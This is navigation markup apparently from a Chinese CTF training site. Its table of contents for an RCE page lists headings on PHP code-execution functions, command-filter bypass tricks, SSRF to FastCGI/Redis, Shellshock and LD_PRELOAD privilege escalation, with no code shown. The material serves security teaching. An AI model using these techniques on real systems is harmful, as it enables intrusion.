      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    
  
    RCE
  

    
  </span>
  
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    
  
    RCE
  

    
  </span>
  
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="目录">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      目录
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#assert-rce" class="md-nav__link">
    <span class="md-ellipsis">
      
        assert() RCE
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#20" class="md-nav__link">
    <span class="md-ellipsis">
      
        %20+关键字绕过
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_1" class="md-nav__link">
    <span class="md-ellipsis">
      
        关键字加 绕过
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_2" class="md-nav__link">
    <span class="md-ellipsis">
      
        进制转换绕过
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#url" class="md-nav__link">
    <span class="md-ellipsis">
      
        URL 编码取反加 ~ 绕过
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_3" class="md-nav__link">
    <span class="md-ellipsis">
      
        输出重定向绕过无回显
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#t" class="md-nav__link">
    <span class="md-ellipsis">
      
        \t 代替空格绕过
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_4" class="md-nav__link">
    <span class="md-ellipsis">
      
        `` 代替命令执行函数绕过
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#passthru-rce" class="md-nav__link">
    <span class="md-ellipsis">
      
        passthru() RCE
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#more-cat" class="md-nav__link">
    <span class="md-ellipsis">
      
        more 代替 cat 绕过
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#data-rce" class="md-nav__link">
    <span class="md-ellipsis">
      
        data 伪协议 RCE
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#eval-rce" class="md-nav__link">
    <span class="md-ellipsis">
      
        eval() RCE
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#create_function-rce" class="md-nav__link">
    <span class="md-ellipsis">
      
        Create_function() RCE
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#java-mvel" class="md-nav__link">
    <span class="md-ellipsis">
      
        Java MVEL 表达式注入
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#java-rce" class="md-nav__link">
    <span class="md-ellipsis">
      
        Java 反射机制 RCE
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#php-810-dev-rce" class="md-nav__link">
    <span class="md-ellipsis">
      
        PHP 8.1.0 dev RCE
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#nl" class="md-nav__link">
    <span class="md-ellipsis">
      
        nl /* 绕过长度限制
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#nginx-rce" class="md-nav__link">
    <span class="md-ellipsis">
      
        Nginx 日志 RCE
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#data" class="md-nav__link">
    <span class="md-ellipsis">
      
        data 伪协议去掉双斜杠绕过
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_5" class="md-nav__link">
    <span class="md-ellipsis">
      
        关键字+双引号绕过
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#tab" class="md-nav__link">
    <span class="md-ellipsis">
      
        Tab 键代替空格绕过
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#base64" class="md-nav__link">
    <span class="md-ellipsis">
      
        &lt; 加 |Base64 绕过空格
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_6" class="md-nav__link">
    <span class="md-ellipsis">
      
        自增代替关键字绕过
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_7" class="md-nav__link">
    <span class="md-ellipsis">
      
        ; 代替 &amp; 与 | 绕过
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_8" class="md-nav__link">
    <span class="md-ellipsis">
      
        * 代替部分关键字绕过
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#0a" class="md-nav__link">
    <span class="md-ellipsis">
      
        %0a 代替 ; 绕过
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ssrf-fastcgi-rce" class="md-nav__link">
    <span class="md-ellipsis">
      
        SSRF FastCGI 协议 RCE
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#redis-rce" class="md-nav__link">
    <span class="md-ellipsis">
      
        Redis 协议 RCE
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Redis 协议 RCE">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-ssrf-redis" class="md-nav__link">
    <span class="md-ellipsis">
      
        1️⃣ SSRF 与 Redis 结合的核心思路
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#shellshock" class="md-nav__link">
    <span class="md-ellipsis">
      
        Shellshock 提权
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#apache-mod-cgi" class="md-nav__link">
    <span class="md-ellipsis">
      
        Apache Mod CGI 提权
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#php-fpm" class="md-nav__link">
    <span class="md-ellipsis">
      
        PHP-FPM 提权
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#gc-uaf" class="md-nav__link">
    <span class="md-ellipsis">
      
        GC UAF 提权
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#json-serializer-uaf" class="md-nav__link">
    <span class="md-ellipsis">
      
        Json Serializer UAF 提权
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_9" class="md-nav__link">
    <span class="md-ellipsis">
      
        &amp;&amp; 代替 &amp; 绕过
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#backtrace-uaf" class="md-nav__link">
    <span class="md-ellipsis">
      
        Backtrace UAF 提权
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ffi" class="md-nav__link">
    <span class="md-ellipsis">
      
        FFI 扩展提权
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#iconv" class="md-nav__link">
    <span class="md-ellipsis">
      
        iconv 提权
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_10" class="md-nav__link">
    <span class="md-ellipsis">
      
        动态加载器提权
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#bash-rce" class="md-nav__link">
    <span class="md-ellipsis">
      
        Bash 错误 RCE（仅支持数字+符号）
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ifs-bash" class="md-nav__link">
    <span class="md-ellipsis">
      
        修改 IFS 绕过 Bash 中禁用空格
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#sudo-vi" class="md-nav__link">
    <span class="md-ellipsis">
      
        sudo vi 提权
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ifsnum" class="md-nav__link">
    <span class="md-ellipsis">
      
        \(IFS\)num 代替空格绕过
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#preg_replace-e-rce-foreach" class="md-nav__link">
    <span class="md-ellipsis">
      
        preg_replace() /e 修饰符 RCE 绕过 foreach
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#escapeshellargcmd-rce" class="md-nav__link">
    <span class="md-ellipsis">
      
        escapeshellarg/cmd RCE
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#php" class="md-nav__link">
    <span class="md-ellipsis">
      
        PHP 函数嵌套绕过
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ld_preload" class="md-nav__link">
    <span class="md-ellipsis">
      
        LD_PRELOAD 环境变量提权
      
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../file_upload/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    文件上传
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../dir_traversal/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    目录穿越
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../logical_vuln/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    逻辑漏洞
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../any_file_read/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    任意文件读取
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_7" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../hc-crypto/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    Crypto | 密码学
  

    
  </span>
  
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_1_7" id="__nav_1_7_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_1_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_1_7">
            <span class="md-nav__icon md-icon"></span>
            
  
    Crypto | 密码学
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-crypto/Recap/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    前情提要
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-crypto/Encode/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    编码基础
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-crypto/Classicalcipher/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    古典密码
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-crypto/Moderncipher.md" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    现代密码
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_8" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../hc-reverse/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    Reverse | 逆向工程
  

    
  </span>
  
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_1_8" id="__nav_1_8_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_1_8_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_1_8">
            <span class="md-nav__icon md-icon"></span>
            
  
    Reverse | 逆向工程
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-reverse/%E5%BC%95%E5%AF%BC%E7%AF%87%EF%BC%9A%E7%81%B5%E9%AD%82F%26Q/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    引导篇：灵魂F&Q
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-reverse/Quick%20Start%EF%BC%9A%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Quick Start：可执行文件
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-reverse/Quick%20Start%EF%BC%9AASM%E6%B1%87%E7%BC%96/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Quick Start：ASM汇编
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-reverse/Quick%20Start%EF%BC%9AExample%20problems/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Quick Start：Example problems
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-reverse/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84IDA/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    从零开始的IDA
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-reverse/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A3%B3/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    从零开始的壳
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_9" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../hc-pwn/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    Pwn | 二进制安全
  

    
  </span>
  
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_1_9" id="__nav_1_9_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_1_9_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_1_9">
            <span class="md-nav__icon md-icon"></span>
            
  
    Pwn | 二进制安全
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-pwn/wsl2_environment/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    wsl2下的环境配置
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-pwn/Asm_x86/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    汇编语言(x86)
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-pwn/Stack_Overflow/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    栈上数组越界&栈溢出
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-pwn/ROP/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    ROP入门
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-pwn/ROP_Tricks/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    常见的ROP技巧
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-pwn/Protections.md" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    常见保护
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-pwn/Tricks.md" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    杂七杂八的解题技巧
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_10" >
        
          
          <label class="md-nav__link" for="__nav_1_10" id="__nav_1_10_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    AWD | 攻防模式
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_1_10_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_1_10">
            <span class="md-nav__icon md-icon"></span>
            
  
    AWD | 攻防模式
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-awd/awd_about/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    AWD介绍
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-awd/awd_platform/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    AWD平台
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-awd/awd_web.exp/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    【WEB】AWD技巧
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-awd/awd_pwn.exp/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    【PWN】AWD技巧
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_11" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../hc-ai/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    AI | 人工智能安全
  

    
  </span>
  
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_1_11" id="__nav_1_11_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_1_11_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_1_11">
            <span class="md-nav__icon md-icon"></span>
            
  
    AI | 人工智能安全
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-ai/What_is_AI/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    初识AI
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-ai/MLP/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    你的第一个神经网络
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_12" >
        
          
          <label class="md-nav__link" for="__nav_1_12" id="__nav_1_12_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    blockchain | 区块链安全
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_1_12_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_1_12">
            <span class="md-nav__icon md-icon"></span>
            
  
    blockchain | 区块链安全
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_12_1" >
        
          
          <label class="md-nav__link" for="__nav_1_12_1" id="__nav_1_12_1_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Move
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_1_12_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_1_12_1">
            <span class="md-nav__icon md-icon"></span>
            
  
    Move
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-blockchain/Move/0x00/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    从0开始的签到题
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-blockchain/Move/0x01/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    独特的所有权
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-blockchain/Move/0x02/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    神奇的时钟
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-blockchain/Move/0x03/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    对象与燃气
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-blockchain/Move/0x04/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    多样的泛型
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_13" >
        
          
          <label class="md-nav__link" for="__nav_1_13" id="__nav_1_13_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    附录
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_1_13_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_1_13">
            <span class="md-nav__icon md-icon"></span>
            
  
    附录
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-appendix/how-to-ask/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    提问的智慧
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-appendix/CTFevent/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    CTF赛事
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-appendix/NSSCTF_Usage/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    NSSCTF平台使用
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-appendix/book/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    推荐书单
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../hc-tags/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    知识点标签
  

    
  </span>
  
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            
  
    知识点标签
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../hc-tags/web/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    Web
  

    
  </span>
  
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2">
            <span class="md-nav__icon md-icon"></span>
            
  
    Web
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-tags/web/sql-injection/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    SQL注入
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-tags/web/sqlmap/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    SQLMap
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-tags/web/PHP_features/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    PHP特性
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../hc-tags/misc/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    Misc
  

    
  </span>
  
  

            </a>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_3">
            <span class="md-nav__icon md-icon"></span>
            
  
    Misc
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../hc-tags/reverse/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    Reverse
  

    
  </span>
  
  

            </a>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_4">
            <span class="md-nav__icon md-icon"></span>
            
  
    Reverse
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_5" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../hc-tags/pwn/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    Pwn
  

    
  </span>
  
  

            </a>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_5">
            <span class="md-nav__icon md-icon"></span>
            
  
    Pwn
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
